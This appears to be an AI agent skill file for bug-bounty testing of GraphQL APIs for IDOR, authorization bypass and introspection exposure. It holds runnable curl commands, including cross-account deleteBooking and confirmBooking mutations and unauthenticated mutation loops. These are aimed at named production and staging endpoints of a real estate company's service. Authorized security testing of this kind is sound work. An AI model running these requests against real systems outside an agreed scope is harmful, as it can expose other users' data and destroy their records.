---
name: graphql-idor
description: Test GraphQL APIs for IDOR, authorization bypass, introspection exposure, and batch query abuse. Use when recon identifies a GraphQL endpoint or the hypothesis-agent outputs GraphQL-specific attack ideas. Trigger on phrases like "test GraphQL", "GraphQL IDOR", "introspection check", "GraphQL authorization", or any time a /graphql or /api/graphql endpoint is in scope.
allowed-tools: Bash
---

# GraphQL IDOR & Authorization Testing

Target: $ARGUMENTS (format: https://hostname/path/to/graphql OR ~/bugbounty/target/recon/)

All commands run directly in Kali WSL.

---

## Hard Stop Rules

- Only test in-scope GraphQL endpoints
- Never submit introspection exposure alone — it's Informational on most platforms unless combined with a demonstrated data leak
- A finding requires actual unauthorized data in the response, not just "introspection is enabled"
- Minimum realistic severity to pursue: Medium

---

## Step 0 — Setup

```bash
export PATH=$PATH:~/go/bin
cat ~/bugbounty/knowledge/weak-patterns.md 2>/dev/null
```

If target is a directory, find the GraphQL endpoint:

```bash
grep -rh "graphql\|/gql" "$ARGUMENTS" 2>/dev/null | grep -oP 'https?://[^\s"]+graphql[^\s"]*' | sort -u
```

Set the target endpoint:

```bash
GRAPHQL_URL="https://TARGET/api/graphql"
AUTH_HEADER="Authorization: Bearer YOUR_TOKEN"  # adjust for target
```

---

## Step 1 — Introspection Probe

Test if introspection is enabled (unauthenticated first, then authenticated):

```bash
# Unauthenticated
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}' | python3 -m json.tool 2>/dev/null | head -50

# Authenticated
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name kind } } } } } } }"}' | python3 -m json.tool 2>/dev/null > /tmp/graphql-schema.json && wc -c /tmp/graphql-schema.json
```

If schema retrieved, extract all query and mutation names:

```bash
python3 -c "
import json, sys
with open('/tmp/graphql-schema.json') as f:
    data = json.load(f)
types = data.get('data',{}).get('__schema',{}).get('types',[])
for t in types:
    if t.get('kind') in ('OBJECT',) and not t['name'].startswith('__'):
        fields = t.get('fields') or []
        if fields:
            print(f\"\n=== {t['name']} ===\")
            for f in fields:
                args = [a['name'] for a in (f.get('args') or [])]
                print(f\"  {f['name']}({', '.join(args)})\")
" 2>/dev/null
```

---

## Step 2 — Authentication Boundary Test

Test each query/mutation with:
1. No auth → expect 401/403 or empty data (not full data)
2. Auth as A1 → baseline what data A1 can see
3. Auth as A1 but querying A2's resources → IDOR test

```bash
# Test: does query return all records or just the authenticated user's?
# Example pattern for REA Group Audience Selector:

# 1. Authenticated — does allBookings return ONLY A1's bookings or ALL users' bookings?
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{"query":"{ allBookings { bookingId userId amount date } }"}' | python3 -m json.tool
```

**If `allBookings` returns bookings with `userId` values different from the authenticated user's ID → Critical IDOR (horizontal privilege escalation / data leak).**

---

## Step 3 — Client-Controlled ID Tests

Look for mutations that accept `userId` or object IDs directly in arguments. These are the highest-value targets.

For REA Group Audience Selector specifically:

```bash
# confirmBooking: userId is attacker-controlled — can A1 confirm A2's booking?
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{
    "query": "mutation confirmBooking($bookingId: String!, $userId: String!, $ioNumber: String!) { confirmBooking(bookingId: $bookingId, userId: $userId, ioNumber: $ioNumber) { bookingId status } }",
    "variables": {
      "bookingId": "A2_BOOKING_ID",
      "userId": "A2_USER_ID",
      "ioNumber": "IO-TEST-001"
    }
  }' | python3 -m json.tool

# uploadCampaign: userId is attacker-controlled
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{
    "query": "mutation uploadCampaign($bookingId: String!, $userId: String!, $campaignId: String!) { uploadCampaign(bookingId: $bookingId, userId: $userId, campaignId: $campaignId) { status } }",
    "variables": {
      "bookingId": "A2_BOOKING_ID",
      "userId": "A2_USER_ID",
      "campaignId": "CAMPAIGN_ID"
    }
  }' | python3 -m json.tool

# deleteBooking: does it check ownership?
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{
    "query": "mutation deleteBooking($bookingId: String!) { deleteBooking(bookingId: $bookingId) { success } }",
    "variables": { "bookingId": "A2_BOOKING_ID" }
  }' | python3 -m json.tool
```

**Pass criteria:** Operation succeeds (no error) on A2's resource using A1's credentials.

---

## Step 4 — Batch Query Abuse

Can a single query enumerate resources across all users?

```bash
# Test getConflicts — does it leak conflict data for any user's suburb/date?
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "$AUTH_HEADER" \
  -d '{
    "query": "query getConflicts($date: String!, $state: String!, $suburb: String!, $propertyTypes: [String]!) { getConflicts(date: $date, state: $state, suburb: $suburb, propertyTypes: $propertyTypes) { bookingId userId amount } }",
    "variables": {
      "date": "2026-05-01",
      "state": "VIC",
      "suburb": "Melbourne",
      "propertyTypes": ["residential"]
    }
  }' | python3 -m json.tool
```

If `userId` fields in the response contain IDs that don't belong to the authenticated user → data leak finding.

---

## Step 5 — Unauthenticated Mutation Attempts

For any mutation in the schema, test whether it can be called without a token:

```bash
for mutation in "createBooking" "confirmBooking" "deleteBooking" "uploadCampaign"; do
  echo "=== $mutation (no auth) ==="
  curl -s -X POST "$GRAPHQL_URL" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation { $mutation }\"}" | python3 -m json.tool 2>/dev/null | head -5
done
```

---

## Step 6 — Document and Triage

For any confirmed finding, write to `~/bugbounty/TARGET/findings/GraphQL-$(date +%Y%m%d).md` using the same format as idor-tester.

Then run `/triager` on the finding before any submission.

Log confirmed-safe patterns:

```bash
cat >> ~/bugbounty/knowledge/weak-patterns.md << EOF

## $(date +%Y-%m-%d) — Confirmed protected: GraphQL [operation] on [target]
**Result:** Server enforces auth/ownership on [operation]
**Pattern:** GraphQL IDOR
**Lesson:** [target] properly scopes [operation] to authenticated user
EOF
```

---

## REA Group Audience Selector — Quick Reference

**Endpoint:** `https://audience-selector-api.devlob-production.realestate.com.au/api/graphql`
**Staging:** `https://audience-selector-api.devlob-staging.realestate.com.au/api/graphql`
**Auth:** JWT from `secure.realestate.com.au/sign_in` → `Authorization: Bearer <token>`
**App UI:** `https://audience-selector.realestate.com.au`

**Known operations (from JS bundle analysis):**
- `query getUserBookings { allBookings { bookingId, userId, amount, count, date } }` ← **does this scope to caller's userId?**
- `mutation createBooking($booking: BookingInput!)`
- `mutation confirmBooking($bookingId: String!, $userId: String!, $ioNumber: String!)` ← **userId is client-controlled**
- `mutation uploadCampaign($bookingId: String!, $userId: String!, $campaignId: String!)` ← **userId is client-controlled**
- `mutation deleteBooking($bookingId: String!)` ← **does it check ownership?**
- `query getConflicts($date, $state, $suburb, $propertyTypes)` ← **does it return other users' conflicts?**

**Priority order:** allBookings scope → confirmBooking userId param → uploadCampaign userId param → deleteBooking ownership
